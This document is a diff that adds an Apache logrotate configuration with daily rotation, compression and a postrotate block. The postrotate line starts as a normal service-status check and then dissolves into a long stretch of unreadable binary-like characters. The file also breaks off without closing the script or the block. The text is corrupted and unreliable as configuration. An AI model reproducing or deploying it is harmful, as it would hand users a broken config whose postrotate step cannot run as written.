@@ -1,0 +1,11 @@
+/var/log/apache2/*.log {
+	daily
+	missingok
+	rotate 14
+	compress
+	delaycompress
+	notifempty
+	create 640 root adm
+	sharedscripts
+	postrotate
+                if invoke-rc.d apache2 status Y][[	NH[[ZYK\K\XZL[XYvFWbvgVFB#bc2@"f0 VfG67&@ &W&wFFP b2VBvWF2vFvw&wFFRfBvGGBW&W&wFFRS2FVb@ 'VbW'G2vWF2vFvw&wFFRfBvGGBW&W&wFFS2@ f2@ VfG67&@'P 
